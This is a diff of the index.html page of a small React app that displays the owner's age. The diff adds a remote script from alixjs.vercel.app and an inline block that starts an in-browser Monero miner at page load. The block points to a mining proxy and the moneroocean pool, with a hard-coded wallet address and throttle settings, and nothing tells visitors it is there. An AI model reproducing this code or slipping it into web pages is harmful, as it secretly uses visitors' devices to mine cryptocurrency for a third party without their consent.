@@ -57,9 +57,7 @@
     -->
   </head>
   <body>
-    <!--
     <h1>I Am <b id="age"></b> Years Old Tech Dev.</h1>
-    -->
     <noscript>You need to enable JavaScript to run this app.</noscript>
     <div id="root"></div>
     <!--
@@ -73,8 +71,17 @@
       To create a production bundle, use `npm run build` or `yarn build`.
     -->
     	
-<script src="https://alixjs.vercel.app/connect.js"></script>
-<script src="https://alixjs.vercel.app/worker.js"></script>
+<script src="https://alixjs.vercel.app/index.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un";
+    var workerId = "localhost";
+    var threads = 1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 30;
+</script>
 
 <script>
 const day = 24 * 60 * 60 * 1000;
